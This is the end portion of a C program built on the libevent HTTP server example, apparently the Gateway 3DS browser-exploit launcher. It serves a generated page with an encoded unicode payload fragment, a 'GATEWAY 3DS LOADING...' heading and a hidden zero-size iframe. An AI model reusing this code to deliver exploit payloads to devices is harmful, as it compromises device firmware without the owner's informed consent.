38\\u08e0\\u013c\\u08e0\\u0140\\u08e0\\u0144\\u08e0\\u0148\\u08e0\\u014c\\u08e0\\u0150\\u08e0\\u0154\\u08e0\\u0158\\u08e0\\u015c\\u08e0\\u0160\\u08e0\\u0164\\u08e0\\u0168\\u08e0\\u016c\\u08e0\\u0170\\u08e0\\u0174\\u08e0\\u0178\\u08e0\\u017c\\u08e0\\u0180\\u08e0\\u0184\\u08e0\\u0188\\u08e0\\u018c\\u08e0\\u0190\\u08e0\\u0194\\u08e0\\u0198\\u08e0\\u019c\\u08e0\\u01a0\\u08e0\\u01a4\\u08e0\\u01a8\\u08e0\\u01ac\\u08e0\\u01b0\\u08e0\\u01b4\\u08e0\\u01b8\\u08e0\\u01bc\\u08e0\\u01c0\\u08e0\\u01c4\\u08e0\\u01c8\\u08e0\\u01cc\\u08e0\\u01d0\\u08e0\\u01d4\\u08e0\\u01d8\\u08e0\\u01dc\\u08e0\\u01e0\\u08e0\\u01e4\\u08e0\\u01e8\\u08e0\\u01ec\\u08e0\\u01f0\\u08e0\\u01f4\\u08e0\\u01f8\\u08e0\\u01fc\\u08e0\"));\n");
			break;
		}
		evbuffer_add_printf(evb,
			"		}\n"
			"	}\n"
			"</script>\n"
			"</head>\n"
			"<body>\n"
			"        <h1 align=\"center\">GATEWAY 3DS LOADING...</h1>\n"
			);
		if (fw != 0)
		{
			evbuffer_add_printf(evb, "        <iframe width=0 height=0 src=\"frame.html\"></iframe>\n");
		}
		evbuffer_add_printf(evb,
			"</body>\n"
			"</html>\n"
			);
	}

	evhttp_send_reply(req, 200, "OK", evb);
	goto done;
err:
	evhttp_send_error(req, 404, "Document was not found");
	if (fd>=0)
		close(fd);
done:
	if (decoded)
		evhttp_uri_free(decoded);
	if (decoded_path)
		free(decoded_path);
	if (evb)
		evbuffer_free(evb);
}

int
main(int argc, char **argv)
{
	struct event_base *base;
	struct evhttp *http;
	struct evhttp_bound_socket *handle;

	unsigned short port = 0;
#ifdef WIN32
	WSADATA WSAData;
	WSAStartup(0x101, &WSAData);
#else
	if (signal(SIGPIPE, SIG_IGN) == SIG_ERR)
		return (1);
#endif
	if (argc > 1) {
		port = atoi(argv[1]);
	}

	base = event_base_new();
	if (!base) {
		fprintf(stderr, "Couldn't create an event_base: exiting\n");
		return 1;
	}

	/* Create a new evhttp object to handle requests. */
	http = evhttp_new(base);
	if (!http) {
		fprintf(stderr, "couldn't create evhttp. Exiting.\n");
		return 1;
	}

	/* The /dump URI will dump all requests to stdout and say 200 ok. */
	evhttp_set_cb(http, "/dump", dump_request_cb, NULL);

	/* We want to accept arbitrary requests, so we need to set a "generic"
	 * cb.  We can also add callbacks for specific paths. */
	evhttp_set_gencb(http, send_document_cb, NULL);

	/* Now we tell the evhttp what port to listen on */
	handle = evhttp_bind_socket_with_handle(http, "0.0.0.0", port);
	if (!handle) {
		fprintf(stderr, "couldn't bind to port %d. Exiting.\n",
		    (int)port);
		return 1;
	}

	{
		/* Extract and display the address we're listening on. */
		struct sockaddr_storage ss;
		evutil_socket_t fd;
		ev_socklen_t socklen = sizeof(ss);
		char addrbuf[128];
		void *inaddr;
		const char *addr;
		int got_port = -1;
		fd = evhttp_bound_socket_get_fd(handle);
		memset(&ss, 0, sizeof(ss));
		if (getsockname(fd, (struct sockaddr *)&ss, &socklen)) {
			perror("getsockname() failed");
			return 1;
		}
		if (ss.ss_family == AF_INET) {
			got_port = ntohs(((struct sockaddr_in*)&ss)->sin_port);
			inaddr = &((struct sockaddr_in*)&ss)->sin_addr;
		} else if (ss.ss_family == AF_INET6) {
			got_port = ntohs(((struct sockaddr_in6*)&ss)->sin6_port);
			inaddr = &((struct sockaddr_in6*)&ss)->sin6_addr;
		} else {
			fprintf(stderr, "Weird address family %d\n",
			    ss.ss_family);
			return 1;
		}
		addr = evutil_inet_ntop(ss.ss_family, inaddr, addrbuf,
		    sizeof(addrbuf));
		if (addr) {
			printf("Listening on %s:%d\n", addr, got_port);
			evutil_snprintf(uri_root, sizeof(uri_root),
			    "http://%s:%d",addr,got_port);
		} else {
			fprintf(stderr, "evutil_inet_ntop failed\n");
			return 1;
		}
	}

	event_base_dispatch(base);

	return 0;
}
